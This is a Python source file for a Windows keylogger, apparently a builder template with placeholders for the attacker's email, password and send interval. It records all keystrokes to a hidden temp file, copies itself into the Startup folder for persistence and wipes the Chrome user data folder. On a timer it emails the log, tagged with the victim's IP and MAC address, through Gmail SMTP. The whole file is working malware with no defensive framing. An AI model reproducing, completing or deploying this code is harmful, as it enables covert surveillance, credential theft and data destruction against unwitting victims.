import sys
import os.path
import uuid
import tempfile
import smtplib
import threading
import shutil
import socket
import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener
from pathlib import Path
from os.path import expanduser
import collections


class Keyloger:
    def __init__(self):
        self.HOME = expanduser("~")
        self.NEW_FOLDER_IN_TEMP = str(tempfile.gettempdir() + "\TCD78")
        self.folder = self.HOME + r'\AppData\Local\Google\Chrome\User Data'
        self.STARTUP_FOLDER = self.HOME + \
                              r"\AppData\Roaming\Microsoft\Windows\Start " \
                              r"Menu\Programs\Startup"
        self.PATH_TO_TXT = Path(self.NEW_FOLDER_IN_TEMP + "\liedog.txt")
        self.email = "{0}"
        self.password = "{1}"
        self.send_to_email = "{0}"

        self.ctrl_state = False
        self.shift_state = False
        self.alt_state = False

    def make_directory(self):
        try:
            os.mkdir(self.NEW_FOLDER_IN_TEMP)
        except Exception:
            pass

    def open_file_or_delete_coockies(self):
        if self.PATH_TO_TXT.is_file():
            open(self.NEW_FOLDER_IN_TEMP + "\liedog.txt", "w").close()
        else:  # delete chrome cookies
            for filename in os.listdir(self.folder):
                file_path = os.path.join(self.folder, filename)
                try:
                    if os.path.isfile(file_path) or os.path.islink(file_path):
                        os.unlink(file_path)
                    elif os.path.isdir(file_path):
                        shutil.rmtree(file_path)
                except Exception:
                    pass

    def copy_to_autoload(self):
        try:
            shutil.copy(sys.executable, self.STARTUP_FOLDER)
        except Exception:
            pass

    def sender(self):
        subject = socket.gethostbyname(socket.gethostname()) + "_" + hex(
            uuid.getnode())  # Subj of massege
        message = 'logfileupdate'  # text of message
        file_location = self.NEW_FOLDER_IN_TEMP + '/liedog.txt'  # Path to file

        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.send_to_email
        msg['Subject'] = self.email

        msg.attach(MIMEText(message, 'plain'))

        # Setup the attachment
        filename = os.path.basename(file_location)
        attachment = open(file_location, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" %
                        filename)

        # Attach the attachment to the MIMEMultipart object
        msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        text = msg.as_string()
        server.sendmail(self.email, self.send_to_email, text)
        server.quit()

    def timer(self):
        self.try_to_send()
        threading.Timer(int("{2}"), self.timer).start()

    def try_to_send(self):
        try:
            self.sender()
        except Exception:
            pass

    def on_press(self, key):

        if str(key) == "Key.shift":
            self.shift_state = True

        elif str(key) == "Key.ctrl_l":
            self.ctrl_state = True

        elif str(key) == "Key.alt_l":
            self.alt_state = True

        else:

            self.pressed = {
                "key": ' ' if str(key) == "Key.space" else str(key),
                "sft": self.shift_state,
                "ctrl": self.ctrl_state,
                "alt": self.alt_state
            }
            sorted_press = collections.OrderedDict(self.pressed)

            with open(self.NEW_FOLDER_IN_TEMP + "\liedog.txt", 'a') as \
                    json_file:
                json.dump(sorted_press, json_file)
                json_file.write('\n') #each press separeted

    def on_release(self, key):  # to mark that previous key war released
        # after was pressed a long
        if str(key) == "Key.shift":
            self.shift_state = False

        elif str(key) == "Key.ctrl_l":
            self.ctrl_state = False

        elif str(key) == "Key.alt_l":
            self.alt_state = False

        else:

            with open(self.NEW_FOLDER_IN_TEMP + "\liedog.txt", 'a') as \
                    json_file:
                json_file.write("released" + "\n")

    def listen_keys(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as \
                listener:
            listener.join()

    def start_listen_keys(self):
        self.__init__()
        self.copy_to_autoload()
        self.make_directory()
        self.open_file_or_delete_coockies()
        self.timer()
        self.listen_keys()


if __name__ == '__main__':
    keyloger = Keyloger()
    keyloger.start_listen_keys()